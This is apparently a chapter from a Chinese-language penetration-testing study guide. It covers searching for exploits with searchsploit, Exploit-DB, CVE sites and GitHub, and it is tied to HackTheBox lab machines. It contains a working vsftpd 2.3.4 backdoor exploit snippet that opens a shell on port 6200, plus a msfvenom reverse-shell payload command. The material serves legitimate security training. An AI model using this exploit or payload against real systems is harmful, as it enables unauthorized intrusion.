# Ch 9 — 漏洞搜尋：searchsploit / Exploit-DB / CVE

> 目標：給定一個服務名稱和版本號，能快速找到可用的 exploit，並知道怎麼評估和使用它。

## 漏洞研究的基本邏輯

你從 nmap 拿到：`Apache 2.4.29`、`vsftpd 2.3.4`、`Samba 3.0.20`

這些版本號是金礦。下一步是：

```
版本號 → 搜尋 → 找 exploit → 評估可用性 → 修改/執行
```

不是每個 exploit 都能直接跑。你要學會**讀 exploit 程式碼**，理解它在做什麼，以及為什麼有時候需要修改。

## searchsploit

searchsploit 是 Exploit-DB 的本地鏡像，離線可用，考試必備。

### 基本搜尋

```bash
searchsploit apache 2.4
searchsploit vsftpd 2.3.4
searchsploit samba 3.0

# 更精確的搜尋
searchsploit -s "samba 3.0.20"   # -s = 嚴格模式，減少噪音
```

### 看 exploit 內容

```bash
# 看完整路徑
searchsploit -p 17491

# 直接查看 exploit 程式碼
searchsploit -x exploits/linux/remote/17491.py

# 複製到當前目錄
searchsploit -m exploits/linux/remote/17491.py
```

### searchsploit 輸出解讀

```
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
Samba 3.0.20 < 3.0.25rc3 - Username Map...   | unix/remote/16320.rb    ← Metasploit
Samba 3.0.x - Remote Code Execution           | linux/remote/16320.rb
vsftpd 2.3.4 - Backdoor Command Execution     | unix/remote/17491.py    ← Python
vsftpd 2.3.4 - Backdoor Command Execution (M) | unix/remote/49757.py    ← 修改版
---------------------------------------------- ---------------------------------
```

路徑規則：
- `unix/remote/` → 攻擊 Unix/Linux 系統的遠端 exploit
- `windows/remote/` → 攻擊 Windows
- `windows/local/` → 本地提權（你已有 shell 才能用）
- `.rb` 結尾 → Metasploit 模組
- `.py` 結尾 → Python 腳本

## Exploit-DB 網站搜尋

```
https://www.exploit-db.com

搜尋方式：
  直接搜服務名 + 版本
  用 CVE 號搜（如果你已知 CVE）
  用平台過濾（Windows / Linux / Web Application）
```

網站比 searchsploit 多一些：有 CVSS 分數、評論、更新的 exploit。

## CVE 搜尋

CVE（Common Vulnerabilities and Exposures）是漏洞的統一編號。

### 找 CVE

```bash
# 從 nmap 輸出的服務版本，去查 CVE
# 網站：
# - cve.mitre.org
# - nvd.nist.gov（有 CVSS 分數）
# - cvedetails.com（容易瀏覽）
```

### 從 CVE 找 exploit

```bash
# searchsploit 支援 CVE 搜尋
searchsploit CVE-2021-3156    # sudo heap overflow

# GitHub 通常有 PoC（Proof of Concept）
# 搜：CVE-2021-3156 PoC
```

## 評估 Exploit 可用性

找到一個 exploit 之後，**不是直接跑**，先讀：

### 讀 exploit 程式碼

```python
# 範例：vsftpd 2.3.4 後門 exploit

# 先看頂部的說明
# Title: VSFTPD v2.3.4 Backdoor Command Execution
# Date: 2011-07-04
# Author: Metasploit
# Platform: Unix

# 然後看它在做什麼：
def exploit(ip, port):
    # 連到 vsftpd，登入觸發後門（使用者名含有 :)）
    s = socket.socket()
    s.connect((ip, port))
    s.recv(1024)
    s.send(b'USER backdoor:)\r\n')   # 冒號加笑臉觸發後門
    s.send(b'PASS anything\r\n')
    # 後門在 6200 port 開一個 shell
    time.sleep(1)
    r = socket.socket()
    r.connect((ip, 6200))
    r.send(b'id\n')
    print(r.recv(1024).decode())
```

讀懂了才能知道：
- 這個 exploit 的前提條件是什麼
- 需要修改哪些參數（IP、port）
- 如果它失敗，可能是什麼原因

### 常見需要修改的地方

```python
# 1. IP 和 port
RHOST = "10.10.10.3"   # 靶機 IP
RPORT = 21

# 2. 你的 IP（反彈 shell）
LHOST = "10.10.14.5"   # 你的 tun0 IP
LPORT = 4444           # 你要監聽的 port

# 3. Payload（shellcode）
# 有些 exploit 用 msfvenom 生成 payload
# msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f py
```

## 常見 exploit 執行問題

### Python 2 vs Python 3

很多 exploit 是 Python 2 寫的：

```bash
# 確認
head -1 exploit.py   # 看 shebang
# 如果是 python2

python2 exploit.py   # 用 python2 跑
# 或修改語法：
# print "xxx"  → print("xxx")
# urllib2      → urllib.request
```

### 缺少依賴

```bash
# 跑 exploit 前先看 import
head -20 exploit.py | grep import

# 安裝缺少的套件
pip3 install requests impacket pyOpenSSL
```

### 調整 exploit 目標

```bash
# 大多數 exploit 需要你改 IP
# 找 RHOST, TARGET, ip = 這類變數
grep -n "RHOST\|TARGET\|host\s*=" exploit.py
```

## GitHub 搜尋 PoC

searchsploit 不是萬能的，新漏洞的 PoC 通常先出現在 GitHub：

```bash
# 搜尋格式
# GitHub: CVE-2021-41773 PoC
# 或
# GitHub: Apache 2.4.49 path traversal

# 找到後
git clone https://github.com/xxx/yyy
cd yyy
# 先看 README
# 再看程式碼
```

## 漏洞搜尋 SOP

```
1. nmap 拿到版本號（如 Apache 2.4.29）
2. searchsploit "apache 2.4"
3. 看輸出，挑「看起來對版本的 RCE/遠端漏洞」
4. searchsploit -x <path> 讀程式碼
5. 評估：前提條件符合嗎？需要什麼？
6. searchsploit -m <path> 複製到工作目錄
7. 修改 IP/port/payload
8. 執行，觀察輸出
9. 失敗 → 讀錯誤，理解原因，不要盲目重試
```

## 本章對應靶機

| 機器 | 要搜的漏洞 |
|------|----------|
| HTB Lame | vsftpd 2.3.4（後門）和 Samba 3.0.20（RCE） |
| HTB Legacy | MS08-067（Windows XP SMB） |
| HTB Blue | MS17-010（EternalBlue） |
| HTB Devel | IIS 7.5 + .aspx 上傳 |

**練習**：對 Lame，用 searchsploit 找 Samba 3.0.20 的 exploit，讀程式碼理解它在做什麼，然後修改執行。

## 自我檢核

- [ ] 能用 `searchsploit <service> <version>` 搜尋
- [ ] 能用 `searchsploit -x` 讀 exploit 程式碼
- [ ] 知道看 exploit 程式碼要找 RHOST/LHOST 在哪
- [ ] 能判斷 exploit 是 Python 2 還是 3，知道怎麼對應處理
- [ ] 在 Lame 找到 Samba exploit 並理解它的攻擊原理

→ [練習 A：完整枚舉 3 台 HTB 機器](./practice-a-enumeration.md)
